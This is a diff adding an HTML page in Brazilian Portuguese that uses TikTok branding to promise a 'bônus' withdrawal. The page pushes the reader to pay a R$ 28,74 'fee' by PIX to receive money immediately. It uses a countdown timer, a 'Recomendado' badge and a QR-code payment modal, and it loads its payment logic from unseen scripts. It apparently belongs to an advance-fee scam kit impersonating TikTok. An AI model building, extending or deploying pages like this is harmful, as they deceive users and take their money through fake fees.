@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receber Agora - TikTok Bônus</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../assets/icons/image.png">
+
+    <!-- TikTok Sans Font -->
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+    <style>
+      @font-face {
+        font-family: 'TikTok Sans';
+        font-style: normal;
+        font-display: swap;
+        font-weight: 300 900;
+        src: url('../assets/fonts/tiktok-sans.woff2') format('woff2-variations');
+      }
+    </style>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../assets/css/index-B1D6e1Fy.css">
+
+    <style>
+      /* Animações */
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .animate-fade-in-up {
+        animation: fadeInUp 0.4s ease-out forwards;
+      }
+
+      /* Estilos do Modal PIX */
+      #pixModal {
+        animation: fadeIn 0.3s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      #pixModal .bg-white {
+        animation: slideUp 0.3s ease-out;
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .line-clamp-2 {
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+        overflow: hidden;
+      }
+
+      /* Spinner Animation */
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .animate-spin {
+        animation: spin 1s linear infinite;
+      }
+
+      /* Animações de Confirmação */
+      .fade-in-up {
+        animation: fadeInUp 0.5s ease-out forwards;
+      }
+
+      .fade-in {
+        animation: fadeIn 0.5s ease-out forwards;
+      }
+
+      .option-card {
+        transition: all 0.3s ease;
+      }
+
+      .option-card.selected {
+        border-color: var(--primary);
+        background-color: var(--card);
+      }
+
+      .option-card:not(.selected) {
+        border-color: var(--border);
+        background-color: var(--muted);
+      }
+    </style>
+</head>
+<body>
+    <div class="min-h-screen bg-background">
+        <!-- Header -->
+        <header class="bg-background sticky top-0 z-10 py-3 border-b border-border/50">
+            <h1 class="text-center text-foreground font-semibold text-lg">Receber Agora</h1>
+        </header>
+
+        <!-- Container Principal -->
+        <div class="max-w-md mx-auto px-4 py-4 space-y-4">
+
+            <!-- Card Principal -->
+            <div class="bg-card rounded-2xl p-6 border border-border animate-fade-in-up">
+                <h2 class="text-lg font-bold text-foreground text-center mb-4">Como deseja receber?</h2>
+
+                <!-- Opção 1: Receber Agora (Express) -->
+                <div id="expressOption" class="option-card selected rounded-xl p-4 mb-4 cursor-pointer border-2">
+                    <div class="flex items-start gap-3">
+                        <div class="w-12 h-12 bg-primary rounded-xl flex items-center justify-center flex-shrink-0">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-primary-foreground">
+                                <line x1="12" y1="2" x2="12" y2="22"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                        </div>
+                        <div class="flex-1">
+                            <div class="flex items-center gap-2 mb-1">
+                                <h3 class="font-bold text-foreground">Receber Agora</h3>
+                                <span class="bg-primary text-primary-foreground text-xs font-semibold px-2 py-0.5 rounded uppercase">Recomendado</span>
+                            </div>
+                            <p class="text-muted-foreground text-sm mb-2">Antecipe seu saque e receba imediatamente via Pix</p>
+                            <p class="text-primary font-bold text-lg mb-3">Taxa: <span id="expressFee">R$ 28,74</span></p>
+                            <div class="space-y-2">
+                                <div class="flex items-center gap-2">
+                                    <div class="w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
+                                            <path d="M20 6 9 17l-5-5"></path>
+                                        </svg>
+                                    </div>
+                                    <span class="text-muted-foreground text-sm">Dinheiro na conta em segundos</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <div class="w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
+                                            <path d="M20 6 9 17l-5-5"></path>
+                                        </svg>
+                                    </div>
+                                    <span class="text-muted-foreground text-sm">Prioridade em campanhas TikTok</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Opção 2: Aguardar 30 Dias -->
+                <div id="waitOption" class="option-card rounded-xl p-4 cursor-pointer border-2">
+                    <div class="flex items-start gap-3">
+                        <div class="w-12 h-12 bg-muted rounded-xl flex items-center justify-center flex-shrink-0">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-muted-foreground">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                        </div>
+                        <div class="flex-1">
+                            <h3 class="font-bold text-foreground mb-1">Aguardar 30 Dias</h3>
+                            <p class="text-muted-foreground text-sm mb-3">Processamento padrão sem taxa adicional</p>
+                            <div class="space-y-2">
+                                <div class="flex items-center gap-2">
+                                    <div class="w-5 h-5 bg-red-500 rounded-full flex items-center justify-center">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
+                                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                                        </svg>
+                                    </div>
+                                    <span class="text-muted-foreground text-sm">30 dias de espera pelo dinheiro</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <div class="w-5 h-5 bg-red-500 rounded-full flex items-center justify-center">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
+                                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                                        </svg>
+                                    </div>
+                                    <span class="text-muted-foreground text-sm">Sem acesso ao valor por 1 mês</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botão de Ação -->
+            <div class="animate-fade-in-up">
+                <button id="actionBtn" class="w-full font-semibold py-4 rounded-xl transition-all flex items-center justify-center gap-2 bg-primary hover:bg-primary/90 text-primary-foreground">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12h14"></path>
+                        <path d="m12 5 7 7-7 7"></path>
+                    </svg>
+                    <span class="uppercase tracking-wide" id="actionBtnText">Quero Receber Agora - R$ 28,74</span>
+                </button>
+            </div>
+
+            <!-- Timer -->
+            <div class="bg-muted rounded-xl py-3 px-4 text-center animate-fade-in-up">
+                <div class="flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-muted-foreground">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <polyline points="12 6 12 12 16 14"></polyline>
+                    </svg>
+                    <span class="text-muted-foreground text-sm">
+                        Oferta disponível por: <span id="timer" class="text-primary font-semibold">05:00</span>
+                    </span>
+                </div>
+            </div>
+
+            <!-- Texto Informativo -->
+            <p class="text-muted-foreground text-xs text-center px-4 animate-fade-in-up">
+                Escolha opcional. Caso não antecipe, seu saque será processado normalmente em 30 dias úteis.
+            </p>
+
+        </div>
+    </div>
+
+    <!-- Modal QR Code PIX (mesmo da confirmação) -->
+    <div id="pixModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl" style="opacity: 1; transform: none;">
+            <!-- Header do Modal -->
+            <div class="bg-[#1a1a1a] px-5 py-4 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#00D4AA] rounded-full flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-white">
+                            <rect width="5" height="5" x="3" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="16" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="3" y="16" rx="1"></rect>
+                            <path d="M21 16h-3a2 2 0 0 0-2 2v3"></path>
+                            <path d="M21 21v.01"></path>
+                            <path d="M12 7v3a2 2 0 0 1-2 2H7"></path>
+                            <path d="M3 12h.01"></path>
+                            <path d="M12 3h.01"></path>
+                            <path d="M12 16v.01"></path>
+                            <path d="M16 12h1"></path>
+                            <path d="M21 12v.01"></path>
+                            <path d="M12 21v-1"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold">Pagamento PIX</h3>
+                        <p class="text-white/60 text-sm" id="modalAmount">R$ 28,74</p>
+                    </div>
+                </div>
+                <button id="closeModalBtn" class="text-white/60 hover:text-white transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6">
+                        <path d="M18 6 6 18"></path>
+                        <path d="m6 6 12 12"></path>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Conteúdo do Modal -->
+            <div class="p-5">
+                <!-- Estado: Loading -->
+                <div id="pixLoadingState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <svg class="w-12 h-12 text-[#E94560] animate-spin mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <p class="text-gray-600">Gerando QR Code PIX...</p>
+                </div>
+
+                <!-- Estado: Erro -->
+                <div id="pixErrorState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-500">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                    <p class="text-red-600 font-medium mb-2">Erro ao gerar PIX</p>
+                    <p id="errorMessage" class="text-gray-500 text-sm text-center mb-4"></p>
+                    <button id="retryPixBtn" class="bg-[#E94560] text-white px-6 py-2 rounded-lg font-medium hover:bg-[#d63d56] transition-colors">
+                        Tentar novamente
+                    </button>
+                </div>
+
+                <!-- Estado: Pagamento Confirmado -->
+                <div id="pixConfirmedState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div id="confirmedTitle" class="text-emerald-600 font-bold text-xl mb-2" style="opacity: 0; transform: translateY(10px);">
+                        Pagamento Confirmado!
+                    </div>
+                    <div id="confirmedSubtitle" class="text-gray-500 text-sm" style="opacity: 0;">
+                        Redirecionando...
+                    </div>
+                    <div id="confirmedSpinner" class="mt-4" style="opacity: 0;">
+                        <svg class="w-6 h-6 text-emerald-500 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Estado: Sucesso (QR Code) -->
+                <div id="pixSuccessState" class="hidden">
+                    <div class="flex justify-center mb-6">
+                        <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-56 h-56 rounded-lg border-2 border-gray-100">
+                    </div>
+                    <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                        <p class="text-gray-700 text-sm font-medium mb-2">Como pagar:</p>
+                        <ol class="text-gray-600 text-sm space-y-1">
+                            <li>1. Abra o app do seu banco</li>
+                            <li>2. Escolha pagar via PIX</li>
+                            <li>3. Escaneie o QR Code ou copie o código</li>
+                        </ol>
+                    </div>
+                    <div class="mb-4">
+                        <p class="text-gray-500 text-xs font-semibold uppercase tracking-wide mb-2">PIX COPIA E COLA</p>
+                        <div class="relative">
+                            <div class="bg-gray-100 rounded-lg p-3 pr-12 overflow-hidden">
+                                <p id="pixCode" class="text-gray-700 text-xs font-mono break-all line-clamp-2"></p>
+                            </div>
+                            <button id="copyPixBtn" class="absolute right-2 top-1/2 -translate-y-1/2 p-2 bg-[#E94560] rounded-lg text-white hover:bg-[#d63d56] transition-colors">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4">
+                                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="flex items-center justify-center gap-2 text-gray-500 text-sm">
+                        <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+                        <span>Aguardando pagamento...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../assets/js/config.js"></script>
+    <script src="../assets/js/url-rewrite.js"></script>
+    <script src="../assets/js/receber-agora.js"></script>
+</body>
+</html>
+
